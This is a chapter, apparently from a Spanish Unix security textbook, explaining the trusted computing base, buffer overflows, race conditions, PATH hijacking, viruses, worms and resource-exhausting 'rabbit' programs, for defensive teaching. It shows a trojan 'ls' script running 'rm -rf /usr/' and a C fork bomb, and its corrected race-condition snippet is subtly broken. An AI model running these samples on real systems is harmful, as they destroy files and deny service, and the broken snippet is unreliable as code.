\chapter{Programas seguros, inseguros y nocivos}
\section{Introducci\'on}
En 1990 Barton P. Miller y un grupo de investigadores publicaron 
\cite{kn:mil90}, un art\'{\i}culo
en el que se mostraba que demasiadas herramientas est\'andar (m\'as del 25\%) 
de Unix fallaban ante elementos tan simples como una entrada anormal. Cinco
a\~nos m\'as tarde otro grupo de investigaci\'on, dirigido tambi\'en por Barton 
P. Miller, realiz\'o el estudio \cite{kn:mil95}, lamentablemente no publicado; 
las conclusiones en este \'ultimo estudio fueron 
sorprendentes: el sistema con las herramientas m\'as estables era Slackware
Linux, un Unix gratuito y de c\'odigo fuente libre que presentaba una tasa de 
fallos muy inferior al de sistemas comerciales como Solaris o IRIX. Aparte de 
este hecho anecd\'otico, era preocupante comprobar como la mayor\'{\i}a de
problemas descubiertos en 1990 segu\'{\i}a presente en los sistemas Unix
estudiados.\\
\\Aunque por fortuna la calidad del {\it software} ha mejorado mucho en los
\'ultimos a\~nos\footnote{En Unix, claro.}, y esa mejora lleva asociada una 
mejora en la robustez del c\'odigo, los fallos y errores de dise\~no en 
aplicaciones o en el propio n\'ucleo son una de las fuentes de amenazas a la 
seguridad de todo sistema inform\'atico. Pero no
s\'olo los errores son problem\'aticos, sino que existen programas -- como los 
virus -- realizados en la mayor\'{\i}a de situaciones no para realizar tareas 
\'utiles sino para comprometer la seguridad de una m\'aquina o de toda una red.
Este tipo de programas s\'olamente compromete la seguridad cuando afectan al
administrador; si un virus infecta ficheros de un usuario, o si \'este ejecuta
un troyano, s\'olo podr\'a perjudicarse a s\'{\i} mismo: podr\'a borrar sus
ficheros, enviar correo en su nombre o matar sus procesos, pero no hacer lo
mismo con el resto de usuarios o el {\it root}. El problema para la seguridad
viene cuando es el propio administrador quien utiliza programas contaminados
por cualquier clase de fauna, y para evitar esto hay una medida de protecci\'on
b\'asica: la {\bf prevenci\'on}. Es crucial que las actividades como 
administrador se reduzcan al m\'{\i}nimo, ejecutando como usuario normal
las tareas que no requieran de privilegios. Cuando no quede m\'as remedio que
trabajar como {\it root} (por ejemplo a la hora de instalar {\it software} 
en el sistema), no hemos de ejecutar nada que no provenga de una
fuente fiable, e incluso as\'{\i} tomar precauciones en caso de que el programa
realice funciones m\'{\i}nimamente delicadas para el sistema operativo (por
ejemplo, probarlo antes en una m\'aquina de testeo, o en entornos cerrados con
{\tt chroot()}). Es muy normal, sobre todo entre administradores de Linux, el
recomendar que no se ejecute nada sin haber le\'{\i}do previamente el c\'odigo
fuente, o al menos que dicho c\'odigo est\'e disponible; esto, aunque es una
soluci\'on perfecta al problema, es inaplicable en la mayor\'{\i}a de 
situaciones. Por un lado, no todas las aplicaciones o sistemas tienen su 
c\'odigo abierto a sus usuarios, por lo que nos estar\'{\i}amos restringiendo a
utilizar programas generalmente no comerciales -- algo que quiz\'as no depende
de nosotros, como administradores --. Por otro, resulta absurdo pensar que un
administrador tenga el tiempo necesario para leer (y lo m\'as importante, para
comprobar) cada l\'{\i}nea del c\'odigo de todos los programas instalados
en sus m\'aquinas.
\section{La base fiable de c\'omputo}
La base fiable (o segura) de c\'omputo ({\it Trusted Computing Base}, TCB) es
una caracter\'{\i}stica de ciertos Unices que incrementa la seguridad del 
sistema marcando ciertos elementos del mismo como `seguros'. Aunque estos 
elementos son b\'asicamente el {\it hardware} y ciertos ficheros, la parte {\it 
software} es mucho m\'as importante para el administrador que la m\'aquina 
f\'{\i}sica, por lo que aqu\'{\i} hablaremos principalmente de ella.
Los ficheros pertenecientes a la base segura de c\'omputo, y la TCB en su 
conjunto, tratan de asegurar al 
administrador que est\'a ejecutando el programa que desea y no otro que un 
intruso haya podido poner en su lugar (conteniendo, por ejemplo, un troyano).
La TCB implementa la pol\'{\i}tica de seguridad del sistema inspeccionando y
vigilando las interacciones entre entidades (procesos) y objetos (principalmente
ficheros); dicha pol\'{\i}tica suele consistir en un control de accesos y en la 
reutilizaci\'on de objetos (c\'omo debe inicializarse o desinstalarse un objeto 
antes de ser reasignado).\\
\\Los ficheros con la marca de seguridad activada son generalmente el propio 
n\'ucleo del sistema operativo y archivos que mantienen datos relevantes para 
la seguridad, contenidos en ciertos directorios como {\tt /tcb/} o {\tt 
/etc/auth/}; cualquier fichero nuevo o que pertenezca a la TCB pero que haya 
sido modificado autom\'aticamente tiene su marca desactivada. Puede ser 
activada o reactivada por el administrador (por ejemplo, en AIX con la orden 
{\tt tcbck -a}), aunque en algunos sistemas para que 
un archivo pertenezca a la TCB tiene que haber sido creado con programas que ya 
pertenec\'{\i}an a la TCB. Con este mecanismo se trata de asegurar que nadie,
y especialmente el {\it root}, va a ejecutar por accidente c\'odigo peligroso:
si el administrador ha de ejecutar tareas sensibles de cara a la seguridad, 
puede arrancar un int\'erprete de comandos seguro (perteneciente a la TCB) que
s\'olo le permitir\'a ejecutar programas que est\'en en la base.\\
\\La comunicaci\'on entre la base fiable de c\'omputo y el usuario se ha de
realizar a trav\'es de lo que se denomina la {\bf ruta de comunicaci\'on fiable}
({\it Trusted Communication Path}, TCP), ruta que se ha de invocar mediante una
combinaci\'on de teclas (por ejemplo, {\tt Ctrl-X} {\tt Ctrl-R} en AIX) 
denominada SAK ({\it Secure Attention Key}) siempre que el usuario deba 
introducir datos que no deban ser comprometidos, como una clave. Tras invocar 
a la ruta de comunicaci\'on fiable mediante la combinaci\'on de teclas 
correspondiente el sistema operativo se ha de asegurar de que los programas no
fiables (los no incluidos en la TCB) no puedan acceder a la terminal desde la
que se ha introducido el SAK; una vez conseguido esto -- generalmente a partir
de {\tt init} -- se solicitar\'a al usuario en la terminal su {\it login} y 
su {\it password}, y si ambos son correctos se lanzar\'a un {\it shell} fiable
({\tt tsh}), que s\'olo ejecutar\'a programas miembros de la TCB (algo que 
es muy \'util por ejemplo para establecer un entorno seguro para la 
administraci\'on del
sistema, si el usuario es el {\it root}). Desde el punto de vista del usuario,
tras pulsar el SAK lo \'unico que aparecer\'a ser\'a un {\it prompt} solicitando
el {\it login} y la clave; si en lugar de esto aparece el s\'{\i}mbolo de {\tt
tsh}, significa que alguien ha intentado robar nuestra contrase\~na: deberemos
averiguar qui\'en est\'a haciendo uso de esa terminal (por ejemplo mediante
{\tt who}) y notificarlo al administrador -- o tomar las medidas oportunas si
ese administrador somos nosotros --.\\
\\A pesar de la utilidad de la TCB, es recomendable recordar que un fichero 
incluido en ella, con la marca activada, no siempre es garant\'{\i}a de 
seguridad; como todos los mecanismos existentes, la base fiable de c\'omputo 
est\'a pensada para utilizarse {\it junto a} otros mecanismos, y no {\it en 
lugar de} ellos.
\section{Errores en los programas}
\label{bufover}
Los errores o {\it bugs} a la hora de programar c\'odigo de aplicaciones o del 
propio 
n\'ucleo de Unix constituyen una de las amenazas a la seguridad que m\'as 
quebraderos de cabeza proporciona a la comunidad de la seguridad inform\'atica.
En la mayor\'{\i}a de situaciones no se trata de desconocimiento a la hora de
realizar programas seguros, sino del hecho que es pr\'acticamente imposible no
equivocarse en miles de l\'{\i}neas de c\'odigo: simplemente el n\'ucleo de 
Minix, un mini-Unix dise\~nado por Andrew Tanenbaum (\cite{kn:tan91}) con fines
docentes, tiene m\'as de 13000 l\'{\i}neas de c\'odigo en su versi\'on 1.0.\\
\\Cuando un error sucede en un programa que se ejecuta en modo usuario el 
\'unico problema que suele causar es la inconveniencia para quien lo estaba
utilizando. Por ejemplo, imaginemos un acceso no autorizado a memoria por parte 
de cierta aplicaci\'on; el sistema operativo detectar\'a que se intenta violar
la seguridad del sistema y finalizar\'a el programa envi\'andole la se\~nal {\sc
sigsegv}. Pero si ese mismo error sucede en un programa que corre con 
privilegios de {\it root} -- por ejemplo, un ejecutable setuidado --, un 
atacante puede aprovechar el fallo para ejecutar c\'odigo malicioso que el 
programa {\it a priori} no deb\'{\i}a ejecutar. Y si un error similar se
produce en el c\'odigo del {\it kernel} del sistema operativo, las consecuencias
son incluso peores: se podr\'{\i}a llegar a producir un {\it Kernel Panic} o,
dicho de otra forma, la parada s\'ubita de la m\'aquina en la mayor\'{\i}a de
situaciones; el error m\'as grave que se puede generar en Unix.
\subsection{Buffer overflows}
Seguramente uno de los errores m\'as comunes, y sin duda el m\'as conocido y
utilizado es el {\it stack smashing} o desbordamiento de pila, tambi\'en 
conocido por {\it buffer overflow}\footnote{Realmente el {\it stack smashing} es
un caso particular del {\it buffer overflow}, aunque al ser el m\'as habitual
se suelen confundir ambos t\'erminos (\cite{kn:cow98}).}; aunque el gusano
de Robert T. Morris (1988) ya lo utilizaba, no fu\'e hasta 1997 cuando este
fallo se hizo realmente popular a ra\'{\i}z de \cite{kn:ale97}. A pesar de que
alguien pueda pensar que en todo el tiempo trascurrido hasta hoy en d\'{\i}a 
los problemas de {\it buffer overflow} estar\'an solucionados, o al menos 
controlados, a\'un se ven con frecuencia alertas sobre programas que se
ven afectados por desbordamientos (justamente hoy, 28 de febrero del 2000, han
llegado a la lista {\sc bugtraq} un par de
programas que aprovechaban estos errores para aumentar el nivel de privilegio
de un usuario en el sistema). Aunque cada vez los programas son m\'as seguros,
especialmente los {\it setuidados}, es casi seguro que un potencial atacante que
acceda a nuestro sistema va a intentar -- si no lo ha hecho ya -- conseguir
privilegios de administrador a trav\'es de un {\it buffer overflow}.\\
\\La idea del {\it stack smashing} es sencilla: en algunas implementaciones de
C es posible corromper la pila de ejecuci\'on de un programa escribiendo 
m\'as all\'a de los l\'{\i}mites de un array declarado {\tt auto} en una 
funci\'on; esto puede causar que la direcci\'on de retorno de dicha funci\'on 
sea una direcci\'on aleatoria. Esto, unido a permisos de los ficheros 
ejecutables en Unix (principalmente a los bits de SetUID y SetGID), hace que
el sistema operativo pueda otorgar acceso {\it root} a usuarios sin
privilegios. Por ejemplo, imaginemos una funci\'on que trate de copiar con
{\tt strcpy()} un array de 200 caracteres en uno de 20: al ejecutar el programa,
se generar\'a una violaci\'on de segmento (y por tanto el cl\'asico {\it 
core dump} al que los usuarios de Unix estamos acostumbrados). Se ha producido
una sobreescritura de la direcci\'on de retorno de la funci\'on; si logramos
que esta sobreescritura no sea aleatoria sino que apunte a un c\'odigo
concreto (habitualmente el c\'odigo de un {\it shell}), dicho c\'odigo se va a
ejecutar.\\
\\>Cu\'al es el problema? El problema reside en los ficheros {\it setuidados} y
{\it setgidados}; recordemos que cuando alguien los ejecuta, est\'a trabajando
con los privilegios de quien los cre\'o, y todo lo que ejecute lo hace con esos
privilegios\ldots incluido el c\'odigo que se ha insertado en la direcci\'on de
retorno de nuestra funci\'on problem\'atica. Si como hemos dicho, este c\'odigo
es el de un int\'erprete de comandos y el fichero pertenece al administrador, 
el atacante consigue ejecutar un {\it shell} con privilegios de {\it root}.\\
\\Existen multitud de {\it exploits} (programas que aprovechan un error en otro
programa para violar la pol\'{\i}tica de seguridad del sistema) disponibles
en Internet, para casi todas las variantes de Unix y que incluyen el c\'odigo
necesario para ejecutar {\it shells} sobre cualquier operativo y arquitectura.
Para minimizar el impacto que los desbordamientos pueden causar en nuestro
sistema es necesaria una colaboraci\'on entre fabricantes, administradores y
programadores (\cite{kn:ins97}, \cite{kn:smi97}\ldots). Los primeros han de
tratar de verificar m\'as la robustez de los programas cr\'{\i}ticos antes de
distribuirlos, mientras que los administradores han de mantener al m\'{\i}nimo
el n\'umero de ficheros {\it setuidados} o {\it setgidados} en sus sistemas y 
los programadores tienen que esforzarse en generar c\'odigo con menos puntos
de desbordamiento; en \cite{kn:cow00} se pueden encontrar algunas l\'{\i}neas
a tener en cuenta en la prevenci\'on de {\it buffer overflows}.
\subsection{Condiciones de carrera}
Otro error muy conocido en el mundo de los sistemas operativos son las
condiciones de carrera, situaciones en las que dos o m\'as procesos leen o 
escriben en un \'area compartida y el resultado final depende de los instantes
de ejecuci\'on de cada uno (\cite{kn:tan91}). Cuando una situaci\'on de este
tipo se produce y acciones que deber\'{\i}an ser at\'omicas no lo son, existe 
un intervalo de tiempo durante el que un atacante puede obtener privilegios, 
leer y escribir ficheros protegidos, y en definitiva violar las pol\'{\i}ticas 
de seguridad del sistema (\cite{kn:bis95b}).\\
\\Por ejemplo, imaginemos un programa {\it setuidado} perteneciente a {\it root}
que almacene informaci\'on en un fichero propiedad del usuario que est\'a 
ejecutando el programa; seguramente el c\'odigo contendr\'a unas l\'{\i}neas
similares a las siguientes (no se ha incluido la comprobaci\'on b\'asica de
errores por motivos de claridad):
\begin{quote}
\begin{verbatim}
if(access(fichero, W_OK)==0){
        open();
        write();
}
\end{verbatim}
\end{quote}
En una ejecuci\'on normal, si el usuario no tiene privilegios suficientes para
escribir en el fichero, la llamada a {\tt access()} devolver\'a {\tt -1} y no
se permitir\'a la escritura. Si esta llamada no falla {\tt open()} tampoco lo
har\'a, ya que el UID efectivo con que se est\'a ejecutando el programa es el 
del {\it root}; as\'{\i} nos estamos asegurando que el programa escriba en el
fichero si y s\'olo si el usuario que lo ejecuta puede hacerlo -- sin 
privilegios adicionales por el {\it setuid} --. Pero, >qu\'e sucede si el 
fichero cambia entre la llamada a {\tt access()} y las siguientes? El programa
estar\'a escribiendo en un archivo sobre el que no se han realizado las
comprobaciones necesarias para garantizar la seguridad. Por ejemplo, imaginemos
que tras la llamada a {\tt access()}, y justo antes de que se ejecute {\tt
open()}, el usuario borra el fichero referenciado y enlaza {\tt /etc/passwd} con
el mismo nombre: el programa estar\'a escribiendo informaci\'on en el fichero
de contrase\~nas.\\
\\Este tipo de situaci\'on, en la que un programa comprueba una propiedad de un 
objeto y luego ejecuta determinada acci\'on asumiendo que la propiedad se 
mantiene, cuando realmente no es as\'{\i}, se denomina TOCTTOU ({\it Time of
check to time of use}). >Qu\'e se puede hacer para evitarla? El propio sistema
operativo nos da las diferentes soluciones al problema (\cite{kn:bis96}). Por
ejemplo, podemos utilizar descriptores de fichero en lugar de nombres: en 
nuestro caso, deber\'{\i}amos utilizar una variante de la llamada {\tt access()}
que trabaje con descriptores en lugar de nombres de archivo (no es algo que
exista realmente, ser\'{\i}a necesario modificar el n\'ucleo del operativo 
para conseguirlo); con esto conseguimos que aunque
se modifique el nombre del fichero, el objeto al que accedemos sea el mismo 
durante todo el tiempo. Adem\'as, es conveniente invertir el orden de las 
llamadas (invocar primero a {\tt open()} y despu\'es a nuestra variante de {\tt 
access()}); de esta forma, el c\'odigo anterior quedar\'{\i}a como sigue:
\begin{quote}
\begin{verbatim}
if((fd=open(fichero, O_WRONLY))==NULL){
        if (access2(fileno(fp),W_OK)==0){
            write();
        }
}
\end{verbatim}
\end{quote}
No obstante, existen llamadas que utilizan nombres de fichero y no tienen un
equivalente que utilice descriptores; para no tener que reprogramar todo el
n\'ucleo de Unix, existe una segunda soluci\'on que cubre tambi\'en a estas
llamadas: asociar un descriptor y un nombre de fichero sin restringir el modo
de acceso. Para esto se utilizar\'{\i}a un modo especial de apertura, {\tt
O$\_$ACCESS} -- que ser\'{\i}a necesario implementar --, en lugar de los 
cl\'asicos {\tt O$\_$RDONLY}, {\tt O$\_$WRONLY} o {\tt O$\_$RDWR}; este nuevo
modo garantizar\'{\i}a que si el objeto existe se har\'{\i}a sobre \'el un
{\tt open()} habitual pero sin derecho de escritura o lectura (ser\'{\i}a 
necesario efectuar una segunda llamada a la funci\'on, con los par\'ametros
adecuados), y si no existe se reserva un nombre y un inodo de tipo `reservado',
un tipo de transici\'on que posteriormente ser\'{\i}a necesario convertir en un
tipo de fichero habitual en Unix (directorio, {\it socket}, enlace\ldots) con
las llamadas correspondientes.
\section{Fauna y otras amenazas}
En el punto anterior hemos hablado de problemas de seguridad derivados de 
errores o descuidos a la hora de programar; sin embargo, no todas las amenazas
l\'ogicas provienen de simples errores: ciertos programas, denominados en su
conjunto {\it malware} o {\it software} malicioso, son creados con la 
intenci\'on principal de atacar a la seguridad\footnote{Realmente, algunos de
ellos no son necesariamente nocivos; es su uso indebido y no la intenci\'on de
su programador lo que los convierte en peligrosos.}. En esta secci\'on vamos a 
hablar de algunos tipos de {\it malware}, sus caracter\'{\i}sticas y sus 
efectos potenciales.\\
\\Para prevenir casi todo el {\it software} malicioso que pueda afectar a 
nuestros sistemas es necesaria una buena concienciaci\'on de los usuarios: bajo
ning\'un concepto han de ejecutar {\it software} que no provenga de fuentes
fiables, especialmente programas descargados de p\'aginas {\it underground} o
ficheros enviados a trav\'es de {\sc irc}. Evidentemente, esto se ha de aplicar
-- y con m\'as rigor -- al administrador de la m\'aquina; si un usuario 
ejecuta un programa que contiene un virus o un troyano, es casi imposible que
afecte al resto del sistema: en todo caso el propio usuario, o sus ficheros,
ser\'an los \'unicos perjudicados. Si es el {\it root} quien ejecuta el programa
contaminado, cualquier archivo del sistema puede contagiarse -- virus -- o las
acciones destructivas del {\it malware} -- troyano -- afectar\'an sin 
l\'{\i}mites a todos los recursos del sistema. Aparte de descargar el {\it
software} de fuentes fiables, es recomendable utilizar las {\it `huellas'} de
todos los programas (generalmente res\'umenes {\sc md5} de los ficheros) para
verificar que hemos bajado el archivo leg\'{\i}timo; tambi\'en es preferible
descargar el c\'odigo fuente y compilar nosotros mismos los programas: aparte 
de cuestiones de eficiencia, siempre tenemos la posibilidad de revisar el
c\'odigo en busca de potenciales problemas de seguridad.\\
\\Otra medida de seguridad muy importante es la correcta asignaci\'on de la
variable de entorno {\it \$PATH}, especialmente para el administrador del
sistema. Esta variable est\'a formada por todos los directorios en los que
el {\it shell} buscar\'a comandos para ejecutarlos; podemos visualizar su
contenido mediante la siguiente orden:
\begin{quote}
\begin{verbatim}
anita:~# echo $PATH
/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/sbin:/usr/local/sbin:
/usr/dt/bin:/usr/openwin/bin:/usr/share/texmf/bin
anita:~# 
\end{verbatim}
\end{quote}
Cuando un usuario teclea una \'orden en la l\'{\i}nea de comandos, el {\it 
shell} busca en cada uno de estos directorios un ejecutable con el mismo 
nombre que el tecleado; si lo encuentra, lo ejecuta sin m\'as, y si no lo 
encuentra se produce un mensaje de error (el cl\'asico {\it `command not 
found'}). Esta b\'usqueda se realiza en el orden en que aparecen los 
directorios del {\it \$PATH}: si por ejemplo se hubiera tecleado {\tt `ls'}, 
en nuestro caso se buscar\'{\i}a en primer lugar {\tt /sbin/ls}; como -- 
seguramente -- no existir\'a, se pasar\'a al siguiente directorio de la 
variable, esto es, se intentar\'a ejecutar {\tt /usr/sbin/ls}. Este fichero
tampoco ha de existir, por lo que se intentar\'a de nuevo con {\tt /bin/ls},
la ubicaci\'on normal del programa, y se ejecutar\'a este fichero.\\
\\>Qu\'e problema hay con esta variable? Muy sencillo: para que sea 
m\'{\i}nimamente aceptable, ninguno de los directorios del {\it \$PATH} ha de
poseer permiso de escritura para los usuarios normales; esto incluye 
evidentemente directorios como {\tt /tmp/}, pero tambi\'en otro que a primera
vista puede no tener mucho sentido: el directorio actual, {\tt `.'}. Imaginemos
la siguiente situaci\'on: el {\it root} de un sistema Unix tiene incluido en su 
variable {\it \$PATH} el directorio actual como uno m\'as donde buscar 
ejecutables; esto es algo muy habitual por cuestiones de comodidad. Por ejemplo,
la variable de entorno puede tener el siguiente contenido:
\begin{quote}
\begin{verbatim}
anita:~# echo $PATH
.:/sbin:/usr/sbin:/bin:/usr/bin:/usr/local/sbin:/usr/local/sbin:
/usr/dt/bin:/usr/openwin/bin:/usr/share/texmf/bin
anita:~#
\end{verbatim}
\end{quote}
Si este administrador desea comprobar el contenido del directorio {\tt /tmp/},
o el de {\it \$HOME} de alguno de sus usuarios (recordemos, directorios donde
pueden escribir), seguramente ir\'a a dicho directorio y ejecutar\'a un simple
{\tt ls}. Pero, >qu\'e sucede si el {\tt `.'} est\'a en primer lugar en la
variable {\it \$PATH}? El {\it shell} buscar\'a en primer lugar en el 
directorio actual, por ejemplo {\tt /tmp/}, de forma que si ah\'{\i} existe un
ejecutable denominado {\tt `ls'}, se ejecutar\'a sin m\'as: teniendo en 
cuenta que cualquiera puede escribir en el directorio, ese programa puede tener
el siguiente contenido:
\begin{quote}
\begin{verbatim}
anita:~# cat /tmp/ls
#!/bin/sh
rm -rf /usr/ &
anita:~#
\end{verbatim}
\end{quote}
Como podemos ver, un inocente {\tt `ls'} puede destruir parte del sistema de
ficheros -- o todo --, simplemente porque el administrador no ha tenido la
precauci\'on de eliminar de su {\it \$PATH} directorios donde los usuarios 
puedan escribir.\\
\\Seguramente alguien encontrar\'a una soluci\'on -- falsa -- a este problema:
si la cuesti\'on reside en el orden de b\'usqueda, >por qu\'e no poner el 
directorio actual al final del {\it \$PATH}, depu\'es de todos los directorios
fiables? De esta forma, el programa {\tt ./ls} no se ejecutar\'a nunca, ya que 
antes el {\it shell} va a encontrar con toda seguridad al programa 
leg\'{\i}timo, {\tt /bin/ls}. Evidentemente esto es as\'{\i}, pero es f\'acil
comprobar que el problema persiste: imaginemos que estamos en esa situaci\'on,
y ahora tecleamos en {\tt /tmp/} la orden {\tt ls$\mid$more}. No ocurrir\'a
nada anormal, ya que tanto {\tt `ls'} como {\tt `more'} son programas que
el {\it shell} ejecutar\'a antes de analizar {\tt `.'}. Pero, >qu\'e 
pasar\'{\i}a si nos equivocamos al teclear, y en lugar de {\tt `more'}
escribimos {\tt `moer'}? Al fin y al cabo, no es un ejemplo tan rebuscado, esto
seguramente le ha pasado a cualquier usuario de Unix; si esto ocurre as\'{\i},
el int\'erprete de \'ordenes no encontrar\'a ning\'un programa que se llame
{\tt `moer'} en el {\it \$PATH}, por lo que se generar\'a un mensaje de 
error\ldots >Ninguno? >Y si un usuario ha creado {\tt /tmp/moer}, con un 
contenido similar al {\tt /tmp/ls} anterior? De nuevo nos encontramos ante el
mismo problema: una orden tan inocente como esta puede afectar gravemente a la
integridad de nuestras m\'aquinas. Visto esto, parece claro que bajo ning\'un
concepto se ha de tener un directorio en el que los usuarios puedan escribir,
ni siquiera el directorio actual ({\tt `.'}) en la variable {\it \$PATH}.
\subsection{Virus}
Un virus es una secuencia de c\'odigo que se inserta en un fichero ejecutable
denominado {\it host}, de forma que al ejecutar el programa tambi\'en se
ejecuta el virus; generalmente esta ejecuci\'on implica la copia del c\'odigo
viral -- o una modificaci\'on del mismo -- en otros programas. El virus 
necesita obligatoriamente un programa 
donde insertarse para poderse ejecutar, por lo que no se puede considerar un
programa o proceso independiente.\\
\\Durante a\~nos, un debate t\'{\i}pico entre la comunidad de la seguridad 
inform\'atica es la existencia de virus en Unix (\cite{kn:rad92}, 
\cite{kn:rad93}, \cite{kn:rad95}\ldots). >Existen virus en este entorno, o por 
el contrario son un producto de otros sistemas en los que el concepto de 
seguridad se pierde? Realmente existen virus sobre plataformas Unix capaces de 
reproducirse e infectar ficheros, tanto ELF como {\it shellscripts}: ya en 1983 
Fred Cohen dise\~n\'o un virus que se ejecutaba con \'exito sobre Unix en una 
VAX 11--750 (\cite{kn:coh94}); a\~nos m\'as tarde, en art\'{\i}culos como 
\cite{kn:duf89} o \cite{kn:mci89} se ha mostrado incluso el c\'odigo necesario 
para la infecci\'on.\\
\\Parece claro que la existencia de virus en Unix es algo sobradamente
comprobado; entonces, >d\'onde est\'a el debate? La discusi\'on se centra en
hasta qu\'e punto un virus para Unix puede comprometer la seguridad del sistema;
generalmente, la existencia de estos virus y sus efectos no suelen ser muy 
perjudiciales en los sistemas Unix de hoy en d\'{\i}a. Se suele tratar de
c\'odigo escrito \'unicamente como curiosidad cient\'{\i}fica, ya que cualquier
acci\'on que realice un virus es en general m\'as f\'acilmente realizable por
otros medios como un simple {\it exploit}; de hecho, uno de los primeros virus
para Unix (en t\'erminos puristas se podr\'{\i}a considerar un 
troyano m\'as que un virus) fu\'e creado por uno de los propios dise\~nadores
del sistema operativo, Ken Thompson (\cite{kn:tho84}), con 
el fin no de da\~nar al sistema, sino de mostrar hasta qu\'e punto se puede 
confiar en el {\it software} de una m\'aquina.
\subsection{Gusanos}
El t\'ermino gusano, acu\~nado en 1975 en la obra de ciencia ficci\'on de John
Brunner {\it The Shockwave Rider} hace referencia a programas capaces de viajar 
por s\'{\i} mismos a trav\'es de 
redes de computadores para realizar cualquier actividad una vez alcanzada una 
m\'aquina; aunque esta actividad no tiene por qu\'e entra\~nar peligro, 
los gusanos pueden instalar en el sistema alcanzado un virus, atacar a este 
sistema como har\'{\i}a un intruso, o simplemente consumir excesivas cantidades
de ancho de banda en la red afectada. Aunque se trata de {\it malware} 
much\'{\i}simo menos habitual que por ejemplo los virus o las puertas traseras,
ya que escribir un gusano peligroso es una tarea muy dif\'{\i}cil, los gusanos
son una de las amenazas que potencialmente puede causar mayores da\~nos: no 
debemos olvidar que el mayor incidente de seguridad de la historia de Unix e
Internet fu\'e a causa de un gusano (el famoso {\it Worm} de 1988).\\
\\Antes del {\it Worm} de Robert T. Morris existieron otros gusanos con fines
muy diferentes; a principios de los setenta Bob Thomas escribi\'o lo que muchos
consideran el primer gusano inform\'atico. Este programa, denominado {\tt 
`creeper'}, no era ni mucho menos {\it malware}, sino que era utilizado en los 
aeropuertos por los controladores a\'ereos para notificar que el control de 
determinado avi\'on hab\'{\i}a pasado de un ordenador a otro. Otros ejemplos
de gusanos \'utiles fueron los desarrollados a principios de los ochenta por
John Shoch y Jon Hupp, del centro de investigaci\'on de Xerox en Palo Alto, 
California; estos {\it worms} se dedicaron a tareas como el intercambio de 
mensajes entre sistemas o el aprovechamiento de recursos ociosos durante la 
noche (\cite{kn:sho82}). Todo funcionaba aparentemente bien, hasta que una 
ma\~nana al llegar al
centro ning\'un ordenador funcion\'o debido a un error en uno de los gusanos;
al reiniciar los sistemas, inmediatamente volvieron a fallar porque el gusano
segu\'{\i}a trabajando, por lo que fu\'e necesario dise\~nar una vacuna. Este 
es considerado el primer incidente de seguridad en el que entraban {\it worms} 
en juego.\\
\\Sin embargo, no fu\'e hasta 1988 cuando se produjo el primer incidente de
seguridad `serio' provocado por un gusano, que a la larga se ha convertido en
el primer problema de seguridad inform\'atica que salt\'o a los medios 
(\cite{kn:mar88a}, \cite{kn:mar88b}, \cite{kn:roy88}\ldots) y 
tambi\'en en el m\'as grave -- civil, al menos -- de todos los tiempos. El 2
de noviembre de ese a\~no, Robert T. Morris salt\'o a la fama cuando uno de
sus programas se convirti\'o en `el Gusano' con may\'usculas, en el {\it Worm}
de Internet. La principal causa del problema fu\'e la filosof\'{\i}a {\it 
`Security through Obscurity'} que muchos a\'un defienden hoy en d\'{\i}a: este
joven estudiante era hijo del prestigioso cient\'{\i}fico Robert Morris, experto
en Unix y seguridad -- entre otros lugares, ha trabajado por ejemplo
para el {\it National Computer Security Center} estadounidense --, quien 
conoc\'{\i}a perfectamente uno de los muchos fallos en {\it Sendmail}. No
hizo p\'ublico este fallo ni su soluci\'on, y su hijo aprovech\'o ese 
conocimiento para incorporarlo a su gusano (se puede leer parte de esta 
fascinante historia en \cite{kn:sto89}). El {\it Worm} aprovechaba varias 
vulnerabilidades en programas como {\tt sendmail}, {\tt fingerd}, {\tt rsh} y
{\tt rexecd} (\cite{kn:see89}) para acceder a un sistema, contaminarlo, y 
desde \'el seguir actuando hacia otras m\'aquinas (en \cite{kn:spa88}, 
\cite{kn:er89} o \cite{kn:spa91} se pueden encontrar detalles concretos del
funcionamiento de este gusano). En unas horas, miles de equipos conectados a la
red dejaron de funcionar (\cite{kn:spa89}), todos presentando una sobrecarga
de procesos {\tt sh} (el nombre camuflado del gusano en los sistemas Unix); 
reiniciar el sistema no era ninguna soluci\'on, porque tras unos minutos de
funcionamiento el sistema volv\'{\i}a a presentar el mismo problema.\\
\\Fueron necesarias muchas horas de trabajo para poder detener el {\it Worm}
de Robert T. Morris; expertos de dos grandes universidades norteamericanas,
el MIT y Berkeley, fueron capaces de desensamblar el c\'odigo y proporcionar
una soluci\'on al problema. Junto a ellos, cientos de administradores y 
programadores de todo el mundo colaboraron ininterrumpidamente durante varios 
d\'{\i}as para analizar c\'omo se hab\'{\i}an contaminado y cu\'ales eran los 
efectos que el gusano hab\'{\i}a causado en sus 
sistemas. El d\'{\i}a 8 de noviembre, casi una semana despu\'es del ataque,
expertos en seguridad de casi todos los \'ambitos de la vida estadounidense
se reunieron para aclarar qu\'e es lo que pas\'o exactamente, c\'omo se 
hab\'{\i}a resuelto, cu\'ales eran las consecuencias y c\'omo se pod\'{\i}a
evitar que sucediera algo parecido en el futuro; all\'{\i} hab\'{\i}a 
desde investigadores del MIT o Berkeley hasta miembros de la CIA, el 
Departamento de Energ\'{\i}a o el Laboratorio de Investigaci\'on Bal\'{\i}stica,
pasando por supuesto por miembros del {\it National Computer Security Center},
organizador del evento. Esta reuni\'on, y el incidente en s\'{\i}, marcaron un
antes y un despu\'es en la historia de la seguridad inform\'atica; la 
sociedad en general y los investigadores en particular tomaron conciencia del
grave problema que supon\'{\i}a un ataque de esa envergadura, y a partir de
ah\'{\i} comenzaron a surgir organizaciones como el CERT, encargadas de velar
por la seguridad de los sistemas inform\'aticos. Tambi\'en se determinaron
medidas de prevenci\'on que siguen vigentes hoy en d\'{\i}a, de forma que otros
ataques de gusanos no han sido tan espectaculares: a finales de 1989 un gusano
llamado {\tt wank}, que a diferencia del de Morris era destructivo, no tuvo
ni de lejos las repercusiones que \'este. Desde entonces, no ha habido ninguna
noticia importante -- al menos publicada por el CERT -- de gusanos en entornos
Unix.
\subsection{Conejos}
Los conejos o bacterias son programas que de forma directa no da\~nan al 
sistema, 
sino que se limitan a reproducirse, generalmente de forma exponencial, hasta 
que la cantidad de recursos consumidos (procesador, memoria, disco\ldots) se 
convierte en una negaci\'on de servicio para el sistema afectado. Por ejemplo,
imaginemos una m\'aquina Unix sin una {\it quota} de procesos establecida; 
cualquier usuario podr\'{\i}a ejecutar un c\'odigo como el siguiente:
\tt
\begin{quote}
\begin{verbatim}
main(){
    while(1){
        malloc(1024);
        fork();
    }
}    
\end{verbatim}
\end{quote}
\rm
